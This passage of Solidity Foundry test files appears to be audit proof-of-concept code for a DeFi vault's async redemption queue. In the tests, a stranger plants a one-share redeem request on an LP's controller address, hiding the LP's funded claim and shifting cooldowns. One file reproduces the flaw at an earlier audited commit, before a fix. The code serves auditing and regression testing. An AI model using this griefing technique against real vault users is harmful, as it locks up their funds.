        assertEq(juniorVault.lastDepositTime(VICTIM_LP), cooldownBefore);
        assertEq(juniorVault.redeem(shares, VICTIM_LP, VICTIM_LP), assets);
        vm.stopPrank();
    }

    /// When the LP's own request is in the same epoch, the stranger's share merges into it and nothing is hidden.
    function test_LpsOwnRequestInTheSameEpochAbsorbsTheShare() public {
        _lps(juniorVault);
        uint256 plantId = _plant(juniorVault, FRESH_1);
        uint256 half = juniorVault.balanceOf(VICTIM_LP) / 2;
        uint256 lpRequestId = _requestAsyncRedeem(juniorVault, VICTIM_LP, half);
        assertEq(lpRequestId, plantId, "one entry for the controller in this epoch");
        _settleAsyncRequest(lpRequestId, true);
        assertEq(juniorVault.claimableRedeemRequest(lpRequestId, VICTIM_LP), half + 1);
        assertEq(juniorVault.maxRedeem(VICTIM_LP), half + 1);
        uint256 assets = juniorVault.maxWithdraw(VICTIM_LP);
        assertGt(assets, 49_000e6);
        vm.prank(VICTIM_LP);
        assertEq(juniorVault.redeem(half + 1, VICTIM_LP, VICTIM_LP), assets);
        assertEq(juniorVault.controllerRedeemHead(VICTIM_LP), 0);
    }

    /// An LP that keeps its shares at one address and always names another as controller: the cooldown from a
    /// reclaim lands on the controller address, the shares stay free. The standard claims of the controller address
    /// are still hidden until it reclaims.
    function test_StandingControllerSplit_KeepsTheCooldownOffTheShares() public {
        _lps(juniorVault);
        uint256 quarter = juniorVault.balanceOf(VICTIM_LP) / 4;

        // The LP's first redemption through its controller address tells the stranger which address to name.
        vm.prank(VICTIM_LP);
        uint256 first = juniorVault.requestRedeem(quarter, VICTIM_LP_SECOND, VICTIM_LP);
        _settleAsyncRequest(first, true);
        vm.prank(VICTIM_LP_SECOND);
        juniorVault.redeem(quarter, VICTIM_LP, VICTIM_LP_SECOND);

        uint256 plantId = _plantOn(juniorVault, FRESH_1, VICTIM_LP_SECOND);
        _settleAsyncRequest(plantId, true);
        vm.prank(VICTIM_LP);
        uint256 second = juniorVault.requestRedeem(quarter, VICTIM_LP_SECOND, VICTIM_LP);
        _settleAsyncRequest(second, true);
        uint256 assets = juniorVault.claimableRedeemAssets(second, VICTIM_LP_SECOND);
        assertGt(assets, 24_000e6);
        assertEq(juniorVault.maxRedeem(VICTIM_LP_SECOND), 0, "the controller's funded claim is hidden");
        vm.expectRevert(_maxRedeemError(VICTIM_LP_SECOND, quarter, 0));
        vm.prank(VICTIM_LP_SECOND);
        juniorVault.redeem(quarter, VICTIM_LP, VICTIM_LP_SECOND);

        uint256 sharesClock = juniorVault.lastDepositTime(VICTIM_LP);
        vm.prank(VICTIM_LP_SECOND);
        assertEq(juniorVault.claimRedeemRefund(plantId, VICTIM_LP_SECOND, VICTIM_LP_SECOND), 1);
        assertEq(juniorVault.lastDepositTime(VICTIM_LP_SECOND), vm.getBlockTimestamp(), "the cooldown lands on the controller address");
        assertEq(juniorVault.lastDepositTime(VICTIM_LP), sharesClock, "the address that holds the shares is untouched");
        vm.prank(VICTIM_LP_SECOND);
        assertEq(juniorVault.redeem(quarter, VICTIM_LP, VICTIM_LP_SECOND), assets);
        vm.startPrank(VICTIM_LP);
        juniorVault.transfer(VICTIM_LP_THIRD, 1);
        juniorVault.requestRedeem(quarter, VICTIM_LP_SECOND, VICTIM_LP);
        vm.stopPrank();
    }

    /// A controller address that has never been used: a stranger's request in the same epoch merges into the LP's
    /// own entry, and one filed in a later epoch sits behind it. The standard claims work for that redemption.
    function test_FreshControllerPerRedemption_KeepsTheStandardClaims() public {
        _lps(juniorVault);
        uint256 quarter = juniorVault.balanceOf(VICTIM_LP) / 4;
        vm.prank(VICTIM_LP);
        uint256 lpRequestId = juniorVault.requestRedeem(quarter, VICTIM_LP_THIRD, VICTIM_LP);
        assertEq(_plantOn(juniorVault, FRESH_1, VICTIM_LP_THIRD), lpRequestId, "same epoch: merged");
        _settleAsyncRequest(lpRequestId, true);
        uint256 laterId = _plantOn(juniorVault, FRESH_2, VICTIM_LP_THIRD);
        assertGt(laterId, lpRequestId);
        _settleAsyncRequest(laterId, true);

        assertEq(juniorVault.controllerRedeemHead(VICTIM_LP_THIRD), lpRequestId);
        assertEq(juniorVault.maxRedeem(VICTIM_LP_THIRD), quarter + 1);
        uint256 assets = juniorVault.maxWithdraw(VICTIM_LP_THIRD);
        assertGt(assets, 24_000e6);
        vm.prank(VICTIM_LP_THIRD);
        assertEq(juniorVault.redeem(quarter + 1, VICTIM_LP, VICTIM_LP_THIRD), assets);
    }

    /// A holder that only uses IERC7540 / IERC7575 functions. The standard view `claimableRedeemRequest` shows its
    /// redemption as funded while `maxRedeem` is zero, and it has no call that claims. Approving an operator is a
    /// standard call; the operator can then claim by request id for it.
    function test_StandardOnlyHolder_CannotClaimUntilAnOperatorDoesItByRequestId() public {
        _lps(juniorVault);
        StandardOnlyHolder holder = new StandardOnlyHolder(juniorVault);
        uint256 half = juniorVault.balanceOf(VICTIM_LP) / 2;
        vm.prank(VICTIM_LP);
        juniorVault.transfer(address(holder), half);

        uint256 plantId = _plantOn(juniorVault, FRESH_1, address(holder));
        _settleAsyncRequest(plantId, true);
        uint256 exitId = holder.requestExit(half);
        _settleAsyncRequest(exitId, true);

        assertEq(juniorVault.claimableRedeemRequest(exitId, address(holder)), half, "funded, by the standard view");
        uint256 assets = juniorVault.claimableRedeemAssets(exitId, address(holder));
        assertGt(assets, 24_000e6);
        assertEq(juniorVault.maxRedeem(address(holder)), 0);
        assertEq(juniorVault.maxWithdraw(address(holder)), 0);
        vm.expectRevert(_maxRedeemError(address(holder), 0, 0));
        holder.claimAll(VICTIM_LP);

        // Three more epochs change nothing.
        for (uint256 i; i < 3; ++i) {
            uint256 otherLpRequestId = _requestAsyncRedeem(juniorVault, OTHER_LP, juniorVault.balanceOf(OTHER_LP) / 4);
            _settleAsyncRequest(otherLpRequestId, true);
            _finishAsyncCooldown(juniorVault, OTHER_LP);
        }
        assertEq(juniorVault.maxRedeem(address(holder)), 0);
        vm.expectRevert(_maxRedeemError(address(holder), 0, 0));
        holder.claimAll(VICTIM_LP);

        // The way out is outside the two standard interfaces: an approved operator claims by request id.
        holder.approveOperator(OPERATOR);
        vm.prank(OPERATOR);
        assertEq(juniorVault.claimRedeem(exitId, half, VICTIM_LP, address(holder)), assets);
    }

}
```

`packages/perps/test/perps/poc/UnsolicitedRedeemRequestAtAuditedCommit.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {HousePoolAsyncTestBase} from "../shared/HousePoolTestBase.sol";

/// @notice Runs only on the audited commit 6d6622f2 (the commit the Cecuro audit reviewed), not on a82d4fef.
///         Place it at packages/perps/test/perps/poc/ in a checkout of 6d6622f2 and run
///         `forge test --match-path test/perps/poc/UnsolicitedRedeemRequestAtAuditedCommit.t.sol -vv`.
///
///         At that commit `_requireShareReceiver` accepted another receiver as long as it held no shares
///         (TrancheVault.sol:1598-1607 there). An LP with an unsolicited refundable entry at the head of its redeem
///         list could therefore reclaim the stranger's share to an empty address and keep its own cooldown untouched.
///         The fix for LOW-39 and LOW-40 (`receiver == controller`) removed that destination.
contract UnsolicitedRedeemRequestAtAuditedCommit is HousePoolAsyncTestBase {

    address internal constant VICTIM_LP = address(0xA11CE); // the LP
    address internal constant VICTIM_LP_SECOND = address(0xA11CE2); // a second address of the LP
    address internal constant STRANGER = address(0xBAD); // any other share holder
    address internal constant FRESH_1 = address(0xF001); // a fresh holder of one share-wei
    address internal constant EMPTY = address(0xE0E0); // an address that holds no shares

    function test_AtTheAuditedCommit_TheLpCouldSendTheShareToAnEmptyAddress() public {
        _fundTrancheAsync(juniorVault, VICTIM_LP, 100_000e6);
        _fundTrancheAsync(juniorVault, STRANGER, 100e6);
        _finishAsyncCooldown(juniorVault, VICTIM_LP);
        _finishAsyncCooldown(juniorVault, STRANGER);

        vm.prank(STRANGER);
        juniorVault.transfer(FRESH_1, 1);
        vm.prank(FRESH_1);
        uint256 plantId = juniorVault.requestRedeem(1, VICTIM_LP, FRESH_1);
        _settleAsyncRequest(plantId, true);
        assertEq(juniorVault.refundableRedeemRequest(plantId, VICTIM_LP), 1);

        uint256 half = juniorVault.balanceOf(VICTIM_LP) / 2;
        uint256 lpRequestId = _requestAsyncRedeem(juniorVault, VICTIM_LP, half);
        _settleAsyncRequest(lpRequestId, true);
        uint256 assets = juniorVault.claimableRedeemAssets(lpRequestId, VICTIM_LP);
        assertGt(assets, 49_000e6);
        assertEq(juniorVault.maxRedeem(VICTIM_LP), 0, "the funded redemption was hidden at this commit as well");

        uint256 clock = juniorVault.lastDepositTime(VICTIM_LP);
        vm.startPrank(VICTIM_LP);
        assertEq(juniorVault.claimRedeemRefund(plantId, EMPTY, VICTIM_LP), 1);
        assertEq(juniorVault.balanceOf(EMPTY), 1, "the stranger's share went to the empty address");
        assertEq(juniorVault.lastDepositTime(VICTIM_LP), clock, "the LP's own cooldown did not restart");
        assertEq(juniorVault.redeem(half, VICTIM_LP, VICTIM_LP), assets);
        uint256 left = juniorVault.balanceOf(VICTIM_LP);
        juniorVault.transfer(VICTIM_LP_SECOND, left / 4);
        juniorVault.requestRedeem(left / 4, VICTIM_LP, VICTIM_LP);
        vm.stopPrank();
    }

}
```

